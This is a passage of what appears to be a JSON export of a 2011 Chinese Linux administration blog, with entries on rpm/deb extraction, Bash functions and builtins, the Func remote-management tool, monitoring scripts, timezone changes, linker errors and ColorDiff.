    "content": "<p><strong><tt id=\"checkoutcmd\">1 </tt>Redhat/Centos/Fedorade的rpm查看和提取</strong>\n<pre class=\"sh_bash\">#rpm -qlp VirtualBox-4.0-4.0.2_69518_openSUSE113-1.i586.rpm\nwarning: VirtualBox-4.0-4.0.2_69518_openSUSE113-1.i586.rpm: Header V4 DSA/SHA1 Signature, key ID 98ab5139: NOKEY\n/etc/init.d/vboxdrv\n/etc/init.d/vboxweb-service</p>\n\n<p>/etc/vbox\n/lib/modules\n/lib/modules/2.6.34.7-0.7-default\n...﻿﻿</pre>\n其中 q -查询RPM文件  l -列出文件  p -指定包的名称<!--more--></p>\n\n<p><span><em>cpio</em>命令是通过重定向的方式将文件进行打包备份，还原恢复的工具，在这里先转换到cpio归档文件，再提取！\n</span><pre class=\"sh_bash\"><span>#  rpm2cpio VirtualBox-4.0-4.0.2_69518_openSUSE113-1.i586.rpm |cpio  -idmv\n./etc/init.d/vboxdrv\n./etc/init.d/vboxweb-service\n./etc/vbox\n./lib/modules\n./lib/modules/2.6.34.7-0.7-default\n...</span></pre>\n<span> <strong>2 Debian/Ubuntu的deb查看和提取</strong>\n</span><span>dpkg的是Debian软件包管理器，使用dpkg可以列出和提取\n</span><pre class=\"sh_bash\"><span># dpkg -c lcrt_0.0.8_i386.deb\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:27 ./\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/pixmaps/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/doc/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/menu/\n-rw-r--r-- niutao/niutao   157 2011-02-28 21:55 ./usr/share/menu/lcrt\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/man/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/man/man1/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/lcrt/\ndrwxr-xr-x niutao/niutao     0 2011-02-28 21:55 ./usr/share/lcrt/pixmaps/\n...</span></pre>\n<span> # dpkg -x lcrt_0.0.8_i386.deb lcrt  //提取文件到lcrt目录下\nlinux-3qd1:/home/dongwm/下载 # cd lcrt/\nDEB是ar文件，他总是包含三个文件-</span><span>- debian-binary，control.tar.gz ，data.tar.gz，可以使用ar </span>提取data.tar.gz  再解压data.tar.gz\n<pre class=\"sh_bash\"><span># ar -vx lcrt_0.0.8_i386.deb\nx - debian-binary\nx - control.tar.gz\nx - dat</span><span>a.tar.gz</span></p>\n\n<p><span># tar zxvf data.tar.gz\n./\n./usr/\n./usr/share/\n./usr/share/pixmaps/\n./usr/share/doc/\n./usr/share/menu/\n./usr/share/menu/lcrt\n./usr/share/man/\n./usr/share/man/man1/\n./usr/share/lcrt/\n./usr/share/lcrt/pixmaps/\n...</span></pre></p>\n\n<p>Technorati 标签: <a class=\"performancingtags\" rel=\"tag\" href=\"http://technorati.com/tag/deb%EF%BC%8Crpm%20%E6%8F%90%E5%8F%96\">deb，rpm 提取</a>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=85bcf861-826e-88ae-875a-9782b192b7d1\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "February",
      "day": "28"
    }
  },
  {
    "id": 28,
    "title": "Bash Shell的Functions功能及应用",
    "category": "Bash Shell",
    "tags": [

    ],
    "url": "/archives/bash-shell%E7%9A%84functions%E5%8A%9F%E8%83%BD%E5%8F%8A%E5%BA%94%E7%94%A8/",
    "content": "<p><strong>Bash Shell的functions和aliases可以定义一些快捷方式和复杂的命令，但是aliases不支持控制流和带参数的命令。\n</strong><strong>functions的语法：\n</strong></p>\n\n<p><pre class=\"sh_bash\">function functionname()\n{\ncommands\n.\n.\n}</pre></p>\n\n<p><strong>执行functions也可以带位置参数：\n</strong></p>\n\n<p>#functionname $ARG1 $ARG2<!--more--><!--more-->\n1 寻找当前目录下符合特定需要的文件列表--类似与find+ls的组合\n<pre class=\"sh_bash\">linux-3qd1:/home/dongwm # touch test.hello\nlinux-3qd1:/home/dongwm # function lstype()\n{\nfind . -type f -iname '*.'${1}'' -exec ls -l {} \\;;\n}\nlinux-3qd1:/home/dongwm # lstype hello //寻找后缀是hello的文件\n-rw-r--r-- 1 root root 0 03-01 15:43 ./test.hello</pre></p>\n\n<p>2 查找符合要求的文件并将这些文件都执行一些命令操作：\n<pre class=\"sh_bash\">linux-3qd1:/home/dongwm # function superexec()\n&gt; {\n&gt; find  . -type f -iname '*.'${1}'' -exec ${@:2}  {} \\; ;\n&gt; }\nlinux-3qd1:/home/dongwm # ll test.hello\n-rw-r--r-- 1 root root 0 03-01 15:43 test.hello\nlinux-3qd1:/home/dongwm # superexec hello chmod 755\nlinux-3qd1:/home/dongwm # ll test.hello //将符合要求的文件修改权限为755，本例只有一个符合要求文件\n-rwxr-xr-x 1 root root 0 03-01 15:43 test.hello</pre>\n3  得到指定接口的IP地址：\n<pre class=\"sh_bash\">#  function getip(\n&gt; {\n&gt; /sbin/ifconfig ${1:-eth0} | awk '/inet addr/ {print $2}' | awk -F: '{print $2}';\n&gt; }\n[root@sys00 ~]# getip\n58.81.202.10\n[root@sys00 ~]# getip  eth0\n58.81.202.10\n[root@sys00 ~]# getip  eth1\n192.168.30.13</pre>\n4  输出服务器一些细节信息：\n<pre class=\"sh_bash\"># function machine()\n&gt; {\n&gt;     echo -e \"\\nMachine information:\" ; uname -a\n&gt;     echo -e \"\\nUsers logged on:\" ; w -h\n&gt;     echo -e \"\\nCurrent date :\" ; date\n&gt;     echo -e \"\\nMachine status :\" ; uptime\n&gt;     echo -e \"\\nMemory status :\" ; free\n&gt;     echo -e \"\\nFilesystem status :\"; df -h\n&gt; }\nlinux-3qd1:/home/dongwm # machine</p>\n\n<p>Machine information:\nLinux linux-3qd1 2.6.34.7-0.7-desktop #1 SMP PREEMPT 2010-12-13 11:13:53 +0100 i686 athlon i386 GNU/Linux</p>\n\n<p>Users logged on:\ndongwm   :0        09:08   ?xdm?  55:54   0.69s /usr/bin/gnome-session</p>\n\n<p>Current date :\n2011年 03月 01日 星期二 16:08:58 CST</p>\n\n<p>Machine status :\n16:08下午  up   7:00,  1 个用户，平均负载：0.18, 0.53, 0.58</p>\n\n<p>Memory status :\ntotal       used       free     shared    buffers     cached\nMem:       1921828    1865884      55944          0     275136    1010768\n-/+ buffers/cache:     579980    1341848\nSwap:      1436668        872    1435796</p>\n\n<p>Filesystem status :\n文件系统              容量  已用 可用 已用% 挂载点\n/dev/sda9              45G   25G   18G  59% /\ndevtmpfs              939M  456K  938M   1% /dev\ntmpfs                 939M  840K  938M   1% /dev/shm\n/dev/sda7             198M  109M   80M  58% /boot\n/dev/sda1              19G   12G  7.6G  60% /media/C\n/dev/sda5              38G   35G  3.1G  92% /media/d\n/dev/sda6              47G   39G  8.0G  83% /media/e</pre>\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=0c1edaba-a0e9-8031-8651-4ea672f9545b\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "01"
    }
  },
  {
    "id": 29,
    "title": "linux下远程登录工具——lcrt",
    "category": "opensuse",
    "tags": [
      "lcrt"
    ],
    "url": "/archives/linux%E4%B8%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E5%B7%A5%E5%85%B7%E2%80%94%E2%80%94lcrt/",
    "content": "<p>windows下我一直钟爱Xshell，但是linux却真的没有什么好的登录工具，比如Yakuake下使用luit命令很不方便，不能记录帐号密码，不能进行多终端操作等。后来我发现了此工具--Lcrt，这是一个类似于windows下的SecureCRT的软件，虽然功能相对还是很少，但是我相信它是linux最好的远程登录的工具！<!--more-->\n它的项目地址是：http://code.google.com/p/lcrt/\n1 下载安装：\n首先确定依赖的库\n#zypper install   vte-devel\n#yast -i gtk2-devel\n我使用的是从项目版<tt>本库check out一个副本再编译安装：\n</tt><tt id=\"checkoutcmd\">#svn checkout http://lcrt.googlecode.com/svn/trunk/  lcrt\n#cd lcrt\n#make\n#make install\n2  建立一个软连接到桌面\n#ln -s /usr/bin/lcrt  /home/dongwm/桌面/lcrt\n</tt>\n3 目前版本0.0.8功能简介：\n1 支持帐号密码的记忆\n2 支持克隆会话\n3 支持同窗口多个终端会话\n<img style=\"max-width: 800px;\" src=\"http://www.dongwm.com/wp-content/uploads/2011/03/sshot-1.png\" alt=\"\" />\n<tt id=\"checkoutcmd\">\n</tt>Technorati 标签: <a class=\"performancingtags\" rel=\"tag\" href=\"http://technorati.com/tag/lcrt\">lcrt</a></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "01"
    }
  },
  {
    "id": 30,
    "title": "rpm命令深入研究",
    "category": "linux基础",
    "tags": [
      "rpm"
    ],
    "url": "/archives/rpm%E5%91%BD%E4%BB%A4%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>rpm命令是工作中经常用得到的命令了，他是Red Hat Package Manager的简称。</strong></p>\n\n<p><strong>1 通过文件查找它属于那个软件包：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">\n<pre class=\"sh_bash\">\n[root@bogon ~]# rpm -qf /usr/bin/multitail\nmultitail-5.2.6-1.el5.rf</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>2  查看rpm包大量信息：</strong></p>\n\n<p><!--more--></p>\n\n<p><strong> </strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"536\">\n<tbody>\n<tr>\n<td width=\"534\" valign=\"top\">\n<pre class=\"sh_bash\">\n[root@bogon ~]# rpm -qip multitail-5.2.6-1.el6.rf.i686.rpm\nwarning: multitail-5.2.6-1.el6.rf.i686.rpm: Header V3 DSA signature: NOKEY, key ID 6b8d79e6\nName        : multitail                    Relocations: (not relocatable)\nVersion     : 5.2.6                             Vendor: Dag Apt Repository, <a href=\"http://dag.wieers.com/apt/\">http://dag.wieers.com/apt/</a>\nRelease     : 1.el6.rf                      Build Date: Thu 11 Nov 2010 08:58:08 PM EST\nInstall Date: (not installed)               Build Host: lisse.hasselt.wieers.com\nGroup       : Applications/Text             Source RPM: multitail-5.2.6-1.el6.rf.src.rpm\nSize        : 432097                           License: GPL\nSignature   : DSA/SHA1, Thu 11 Nov 2010 10:57:14 PM EST, Key ID a20e52146b8d79e6\nPackager    : Dries Verachtert &lt;dries@ulyssis.org&gt;\nURL         : <a href=\"http://www.vanheusden.com/multitail/\">http://www.vanheusden.com/multitail/</a>\nSummary     : View one or multiple files like tail but with multiple windows\nDescription :\nMultiTail lets you view one or multiple files like the original tail\nprogram. The difference is that it creates multiple windows on your console\n(with ncurses). Merging of 2 or even more logfiles is possible. It can also\nuse colors while displaying the logfiles (through regular expressions), for\nfaster recognition of what is important and what not. It can also filter\nlines (again with regular expressions). It has interactive menus for editing\ngiven regular expressions and deleting and adding windows.</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>3 查看rpm包软件里面文件列表：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">\n<pre class=\"sh_bash\">\n[root@bogon ~]# rpm -qlp multitail-5.2.6-1.el6.rf.i686.rpm\nwarning: multitail-5.2.6-1.el6.rf.i686.rpm: Header V3 DSA signature: NOKEY, key ID 6b8d79e6\n/etc/multitail\n/etc/multitail.conf\n/etc/multitail/colors-example.pl\n/etc/multitail/colors-example.sh\n/etc/multitail/convert-simple.pl\n/usr/bin/multitail\n/usr/share/doc/multitail-5.2.6\n/usr/share/doc/multitail-5.2.6/Changes\n/usr/share/doc/multitail-5.2.6/INSTALL\n/usr/share/doc/multitail-5.2.6/license.txt\n/usr/share/doc/multitail-5.2.6/manual-nl.html\n/usr/share/doc/multitail-5.2.6/manual.html\n/usr/share/doc/multitail-5.2.6/multitail.conf\n/usr/share/doc/multitail-5.2.6/readme.txt\n/usr/share/doc/multitail-5.2.6/scripts\n/usr/share/doc/multitail-5.2.6/scripts/colors-example.pl\n/usr/share/doc/multitail-5.2.6/scripts/colors-example.sh\n/usr/share/doc/multitail-5.2.6/scripts/convert-geoip.pl\n/usr/share/doc/multitail-5.2.6/scripts/convert-simple.pl\n/usr/share/doc/multitail-5.2.6/thanks.txt\n/usr/share/man/man1/multitail.1.gz</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>4 列出rpm包的依赖关系：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">\n<pre class=\"sh_bash\">\n[root@bogon ~]# rpm -qRp multitail-5.2.6-1.el6.rf.i686.rpm\nwarning: multitail-5.2.6-1.el6.rf.i686.rpm: Header V3 DSA signature: NOKEY, key ID 6b8d79e6\n/bin/sh\n/usr/bin/perl\nconfig(multitail) = 5.2.6-1.el6.rf\nlibc.so.6\nlibc.so.6(GLIBC_2.0)\nlibc.so.6(GLIBC_2.1)\nlibc.so.6(GLIBC_2.2)\nlibc.so.6(GLIBC_2.3)\nlibc.so.6(GLIBC_2.3.4)\nlibc.so.6(GLIBC_2.7)\nlibm.so.6\nlibm.so.6(GLIBC_2.0)\nlibncurses.so.5  </pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "01"
    }
  },
  {
    "id": 31,
    "title": "安装使用Func一些总结",
    "category": "func",
    "tags": [
      "func"
    ],
    "url": "/archives/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8func%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/",
    "content": "<p>1  关于Func<strong>\nfunc全称</strong><span style=\"font-family: Times New Roman,serif;\"> </span><span style=\"font-size: x-small;\">Fedora Unified Network Controller </span>,主要用在Radhat, Fedora,OpenSuse,Centos系列系统上由一个server管理任意台服务器的工具,<span style=\"font-size: x-small;\">建立了</span><span style=\"font-size: x-small;\">Master-Slaves </span><span style=\"font-size: x-small;\">主从</span><span style=\"font-size: x-small;\">SSL</span><span style=\"font-size: x-small;\">证书管控体系，可以将证书自动分发到所有受控服务.</span>func直接发送远程命令或者远程获取数据,但是只适用于一些常用功能的模块的操作,实现其它功能需要自己写Python API,个人认为没有使用比较适当的\"for do done\"循环程序效果明确和方便.</p>\n\n<p><strong>2  安装配置:</strong>\n1  master端:\n<pre class=\"sh_bash\">#yum install func\n#chkconfig --level 345 certmaster on &amp;&amp; service certmaster start</pre>\n查看默认监听端口:\n[root@server ~]# netstat -tunlp|grep 51235\ntcp        0      0 0.0.0.0:51235               0.0.0.0:*                   LISTEN      9381/python\n2  Minions端,也就是被控端:\n<pre class=\"sh_bash\">#yum install func</pre>\n修改配置文件:\n#vi /etc/certmaster/minion.conf\n[main]\ncertmaster = master.dongwm.com //master端的域名\ncertmaster_port = 51235   //默认的监听端口\nlog_level = DEBUG\ncert_dir = /etc/pki/certmaster\n#chkconfig --level 345 funcd on &amp;&amp; service funcd start\n</pre>\n验证证书:\n<pre class=\"sh_bash\">在master端:\n#certmaster-ca --list   //等待验证的主机列表\nclient.dongwm.com\n#certmaster-ca --sign   client.dongwm.com// 同意客户端验证</pre></p>\n\n<p><strong>3  进行一些操作:</strong>\n语法:\n<pre class=\"sh_bash\">func \"想要操作的服务器或者服务器组的名字,支持正则\" call 想要操作的模块及选项</pre>\n以下操作\n<pre class=\"sh_bash\"># func \"*.dongwm.com\" call disk usage boot  //表达查看所有dongwm.com组(域)服务器的/boot分区情况\n{'client.dongwm.com': {'/boot': {'available': '159177',\n'device': '/dev/sda1',\n'percentage': 14,\n'total': '194442',\n'used': '25226'}}}</pre></p>\n\n<p><!-- \t\t@page { margin: 2cm } \t\tP { margin-bottom: 0.21cm } --><strong>4 其它一些内容(转载)</strong><span style=\"font-family: 宋体;\"><span style=\"font-size: large;\"><strong></strong></span></span></p>\n\n<p>1  删除客户端主机\n<pre class=\"sh_bash\">certmaster-ca -c hostname\n或\nrm /var/lib/certmaster/certmaster/certs/hostname.cert</pre></p>\n\n<p>2  一些常用模块使用命令:</p>\n\n<p><pre class=\"sh_bash\">2.1 CommandModule 模块\n格式：\nfunc hostname call command run command\n2.2ServiceModule 模块\n格式：\nFunc hostname call service start/stop/restart servername\n2.3. HardwareModule 模块\n格式：\nfunc hostname call hardware info\n如果不能执行一般是因为 smolt 没有安装\n2.4 IPtablesModule 模块\n格式：\nfunc hostname call iptables command\n例：\nfunc “ssh-1″ call iptables policy func “ssh-1″ call iptables dump func “ssh-1″ call iptables.port drop_to 53 192.168.0.0/24 udp src\nfunc ’ssh-1′ call iptables run “-L INPUT” func ’ssh-1′ call iptables policy OUTPUT DROP func ’ssh-1′ call iptables drop_from 192.168.0.10\n格式： Func hostname call command run command\n例： func ’ssh-1′ call command run ‘iptables -A INPUT -s 192.168.239.233 -j DROP’\n2.5. JBossModule 模块\n格式：\nfunc hostname call jboss command\n例：\nfunc “*” call jboss status\nfunc “*” call jboss check\nfunc “*” call jboss search_by_instance “default“\nfunc “*” call jboss search_by_address “127.0.0.1“\nfunc “*” call jboss search_by_port 8080\n2.6 ProcessModule 模块\n格式：\nFunc hostname call process command\n例：\nfunc ssh-1 call process info “aux”\nfunc ssh-1 call process mem\nfunc ssh-1 call process kill httpd SIGHUP\n2.7 SysctlModule 模块\n格式：\nFunc hostname call sysctl command\n例：\nfunc ssh-1 call sysctl list\nfunc “*” call sysctl get &lt;parameter&gt; func “*” call sysctl set &lt;parameter&gt; &lt;value&gt;\nfunc ssh-1 call sysctl set net.ipv4.tcp_syncookies 1\n2.8 RpmModule模块 ( =rpm –qa )\nfunc ssh-1 call rpms inventory\n2.9 SmartModule模块 ( 看硬盘信息 )\nfunc ssh-1 call smart info\n2.10YumModule模块\nfunc ssh-1 call yumcmd update\nfunc ssh-1 call command run ‘yum update’</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "02"
    }
  },
  {
    "id": 32,
    "title": "3个有用的shell脚本",
    "category": "Bash Shell",
    "tags": [

    ],
    "url": "/archives/3%E4%B8%AA%E6%9C%89%E7%94%A8%E7%9A%84shell%E8%84%9A%E6%9C%AC/",
    "content": "<p><strong>1  监视系统的CPU，内存使用等情况：（根据CPU和内存使用排序）</strong>\n<pre class=\"sh_bash\">$ cat processes.sh\n#! /bin/bash\n#用于显示CPU使用和内存使用的检查</p>\n\n<p>echo \"开始时间\" `date`\nif [ $# -eq 0 ]\nthen</p>\n\n<p>\techo \"CPU使用率升序排列\"\n\tps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu  # sorted based on %cpu\n\techo \"内存使用升序排列\"\n\tps -e -orss=,args= | sort -b -k1,1n # sorted bases rss value</p>\n\n<p># 可以添加位置参数(mem/cpu)\nelse\n\tcase \"$1\" in\n\tmem)\n\t echo \"内存使用升序排列\"\n \t ps -e -orss=,args= | sort -b -k1,1n\n\t ;;\n \tcpu)\n\t echo \"CPU使用率升序排列\"\n\t ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu\n\t ;;\n \t*)\n\t\techo \"请输入正确的参数 \\n\"\n\t\techo \"可以使用 : $0 mem/cpu\"\n\t\texit 1\n \tesac\t</p>\n\n<p>fi\necho \"结束时间\" `date`\nexit 0</pre>\n使用方式：\n<pre class=\"sh_bash\">\n$ processes.sh\n$ processes.sh mem\n$ processes.sh cpu</pre><!--more-->\n<strong>2 显示登录的用户，以及谁占用的CPU更高：</strong>\n<pre class=\"sh_bash\">$ cat loggedin.sh&lt;br /&gt;#! /bin/bash\nw &gt; /tmp/a\necho \"当前登录的用户总数\"\ncat /tmp/a|  sed '1,2d' | awk '{print $1}' | uniq | wc -l\necho \"\"\necho \"当前登录的用户列表\"&lt;br /&gt;cat /tmp/a | sed '1,2d'|  awk '{print $1}' | uniq\necho \"\"\necho \"占用最高CPU占用率的用户\"\ncat /tmp/a | sed '1,2d' | awk   '$7 &gt; maxuid { maxuid=$7; maxline=$0 }; END { print maxuid, maxline }'\necho \"\"&lt;br /&gt;echo \"当前登录的用户正在进行的操作\"\ncat /tmp/a</pre>\n<strong>3  显示目前内存信息：</strong>\n<pre class=\"sh_bash\">$ cat mem.sh\n#! /bin/bash\n# Total memory space details\necho \"Memory Space Details\"\nfree -t -m | grep \"Total\" | awk '{ print \"Total Memory space : \"$2 \" MB\";\nprint \"Used Memory Space : \"$3\" MB\";\nprint \"Free Memory : \"$4\" MB\";\necho \"Swap memory Details\"\nfree -t -m | grep \"Swap\" | awk '{ print \"Total Swap space : \"$2 \" MB\";\nprint \"Used Swap Space : \"$3\" MB\";\nprint \"Free Swap : \"$4\" MB\";</pre>\n&nbsp;\n<div class=\"zemanta-pixie\"><img class=\"zemanta-pixie-img\" src=\"http://img.zemanta.com/pixy.gif?x-id=b7e6dd89-7b9a-849a-8b75-c2024e5e7b15\" alt=\"\" /></div></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "04"
    }
  },
  {
    "id": 33,
    "title": "15个Bash  Shell内建命令",
    "category": "Bash Shell",
    "tags": [
      "内建命令"
    ],
    "url": "/archives/15%E4%B8%AAbash-shell%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4/",
    "content": "<p><span style=\"font-family: serif;\"><strong></strong></span><strong>Bash Shell内置的命令会快于外部命令，此文用于拓展知识</strong>\n<strong>1  export</strong>\nexport用于导出一个变量或者 function到环境变量\n<pre class=\"sh_bash\">\nexport varname=value\nexport -f functionname # exports function</pre>\n<pre class=\"sh_bash\">[test@9-104 ~]$ export dongwm=www.dongwm\n[test@9-104 ~]$ env\nMAIL=/var/spool/mail/test\nPATH=/usr/kerberos/bin:/usr/local/bin:/bin:/usr/bin:/home/test/bin\ndongwm=www.dongwm\nG_BROKEN_FILENAMES=1\n_=/bin/env</pre></p>\n\n<p><strong>2 eval</strong>\neval我的理解是对一个命令行，执行两次命令行处理\n<pre class=\"sh_bash\">[root@9-104 ~]# pipe=\"|\"\n[root@9-104 ~]# eval ls $pipe wc -l\n29</pre>\nshell第1次扫描命令行时，它替换出pipe的值｜，接着eval使它再次扫描命令行，这时shell把｜作为管道符号了。\n如果变量中包含任何需要shell直接在命令行中看到的字符（不是替换的结果），就可以使用eval。命令行结束符（； ｜ &amp;），I／o重定向符（&lt; &gt;）和引号就属于对shell具有特殊意义的符号，必须直接出现在命令行中。</p>\n\n<p><strong>3 pwd</strong>\n<span>pwd是一个shell内置命令打印当前工作目录。</span> <span><span class=\"google-src-text\" style=\"direction: ltr; text-align: left;\"> </span>它返回值为内置变量$ </span><span><span class=\"google-src-text\" style=\"direction: ltr; text-align: left;\">{PWD}\n</span></span><pre class=\"sh_bash\"><span><span class=\"google-src-text\" style=\"direction: ltr; text-align: left;\">[root@9-104 local]# pwd\n/usr/local\n[root@9-104 local]# echo $PWD\n/usr/local</span></span></pre></p>\n\n<p><span><span class=\"google-src-text\" style=\"direction: ltr; text-align: left;\">其他内置命令：\nhash</span></span>\nreadonly\nshift\ntest\ngetopts\nlogout\numask\nset\nunset\nlet\nshopt\nprintf</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "07"
    }
  },
  {
    "id": 34,
    "title": "linux系统下更改时区（TimeZone）",
    "category": "linux基础",
    "tags": [
      "TimeZone，更改时区"
    ],
    "url": "/archives/linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%9B%B4%E6%94%B9%E6%97%B6%E5%8C%BA%EF%BC%88timezone%EF%BC%89/",
    "content": "<p>假如安装过程没有设置正确的时区，可以修改/etc/localtime文件，改成软链接方式：\n<pre class=\"sh_bash\">[root@9-100 ~]# date\nMon Mar  7 13:45:57 CST 2011\n[root@9-100 ~]# rm /etc/localtime\n[root@9-100 ~]# ll /usr/share/zoneinfo/US/\ntotal 48\n-rw-r--r-- 2 root root 2358 Sep  7 15:39 Alaska\n-rw-r--r-- 3 root root 2353 Sep  7 15:39 Aleutian\n-rw-r--r-- 2 root root  327 Sep  7 15:39 Arizona\n-rw-r--r-- 2 root root 3543 Sep  7 15:39 Central\n-rw-r--r-- 3 root root 3519 Sep  7 15:39 Eastern\n-rw-r--r-- 4 root root 1649 Sep  7 15:39 East-Indiana\n-rw-r--r-- 2 root root  312 Sep  7 15:39 Hawaii\n-rw-r--r-- 3 root root 2395 Sep  7 15:39 Indiana-Starke\n-rw-r--r-- 2 root root 2202 Sep  7 15:39 Michigan\n-rw-r--r-- 4 root root 2427 Sep  7 15:39 Mountain\n-rw-r--r-- 2 root root 2819 Sep  7 15:39 Pacific\n-rw-r--r-- 3 root root  290 Sep  7 15:39 Samoa\n[root@9-100 ~]# cd /etc\n[root@9-100 etc]# ln -s /usr/share/zoneinfo/US/Pacific localtime\n[root@9-100 etc]# date\nSun Mar  6 21:47:38 PST 2011</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "07"
    }
  },
  {
    "id": 35,
    "title": "解决/usr/bin/ld: cannot find -lxxx错误",
    "category": "linux基础",
    "tags": [

    ],
    "url": "/archives/%E8%A7%A3%E5%86%B3usrbinld-cannot-find-lxxx%E9%94%99%E8%AF%AF/",
    "content": "<p>编译安装时候可能会出现类似于以下的这样报错，简单地说是可能是在安装系统中选择的包的问题：\n<pre class=\"bbcodeblock\" style=\"margin: 0px -99999px 0px 0px; padding: 3px; border: 1px inset; width: 98%; height: 50px; text-align: left; overflow: auto;\" dir=\"ltr\">/usr/bin/ld: cannot find -lltdl\ncollect2: ld returned 1 exit status\n解决办法是：\n<pre class=\"sh_bash\">[root@9-104 php-5.2.8]# updatedb\n[root@9-104 php-5.2.8]# locate libltdl  //提示/usr/bin/ld: cannot find -lxxx ，查找时候前面加lib：libxxx  住一 第一个l去掉\n/usr/lib64/libltdl.so.3\n/usr/lib64/libltdl.so.3.1.4\n/usr/share/libtool/libltdl\n/usr/share/libtool/libltdl/COPYING.LIB\n/usr/share/libtool/libltdl/Makefile.am\n/usr/share/libtool/libltdl/Makefile.in\n/usr/share/libtool/libltdl/README\n/usr/share/libtool/libltdl/acinclude.m4\n/usr/share/libtool/libltdl/aclocal.m4\n/usr/share/libtool/libltdl/config-h.in\n/usr/share/libtool/libltdl/config.guess\n...\n注意拉：\n[root@9-104 php-5.2.8]# ln -s /usr/lib64/libltdl.so.3 /usr/lib64/libltdl.so\n原理：给查找到的libxxx文件做软链接\nln -s /usr/lib64/libxxx.so.X（X代表数字） /usr/lib64/lxxx.so</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "07"
    }
  },
  {
    "id": 36,
    "title": "ColorDiff--高亮显示 Diff 输出",
    "category": "linux基础",
    "tags": [
      "ColorDiff"
    ],
    "url": "/archives/colordiff-%E9%AB%98%E4%BA%AE%E6%98%BE%E7%A4%BA-diff-%E8%BE%93%E5%87%BA/",
    "content": "<p><strong>linux下有diff命令对文件进行对比。但是差异对比不够强烈，在此介绍ColorDiff，它是一个perl脚本：</strong></p>\n\n<p><strong>1  下载安装：</strong>\n<pre class=\"sh_bash\"># wget http://colordiff.sourceforge.net/colordiff-1.0.9.tar.gz\n# tar zxvf colordiff-1.0.9.tar.gz\n# cd colordiff-1.0.9\n# make install</pre></p>\n\n<p><strong>2  使用格式：</strong></p>\n\n<p><pre class=\"sh_bash\">colordiff file1 file2\ndiff -u file1 file2 | colordiff</pre>\n<pre class=\"sh_bash\">[root@client ~]# cat line-1.txt\n1\n2\n3\n[root@client ~]# cat line-2.txt\n1\n2\n4</p>\n\n<p>[root@client ~]# colordiff line-1.txt line-2.txt\n3c3,4\n&lt; 3\n---\n&gt; 4\n&gt; </pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "10"
    }
  },
  {
    "id": 37,
    "title": "Bash条件表达式",
    "category": "Bash Shell",
    "tags": [
      "条件表达式"
    ],
    "url": "/archives/bash%E6%9D%A1%E4%BB%B6%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
    "content": "<p>Bash条件表达式：</p>\n\n<p><strong>文件比较运算符</strong>\n<div class=\"bct fc05 fc11 nbw-blog ztag js-fs2\">\n[ -e filename ]  如果filename存在,则为真\n[ -d filename ]  如果filename为目录,则为真\n[ -f filename ]   如果filename为常规文件,则为真    <!--more-->\n[ -L filename ]  如果filename为符号链接,则为真\n[ -r filename ]   如果filename可读,则为真\n[ -w filename ]  如果filename可写,则为真\n[ -x filename ]  如果filename可执行,则为真\n[ filename1 -nt filename2 ] 如果filename1比filename2新,则为真\n[ filename1 -ot filename2 ] 如果filename1比filename2旧,则为真\n<strong>字符串比较运算符</strong>\n[ -z string ] 如果string长度为零,则为真  [ -z \"$myvar\" ]\n[ -n string ] 如果string长度非零,则为真  [ -n \"$myvar\" ]\n[ string1  = string2 ] 如果string1与string2相同,则为真  [ \"$myvar\" = \"one two three\" ]\n[ string1 != string2 ] 如果string1与string2不同,则为真  [ \"$myvar\" != \"one two three\" ]\n<strong>算术比较运算符</strong>\n[ num1 -eq num2 ]  等于\n[ num1 -ne num2 ]  不等于\n[ num1 -lt num2 ]  小于\n[ num1 -le num2 ]  小于或等于\n[ num1 -gt num2 ]  大于\n[ num1 -ge num2 ]  大于或等于</div>\n&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "March",
      "day": "12"
    }
  },
  {
    "id": 38,
    "title": "关于paste命令",
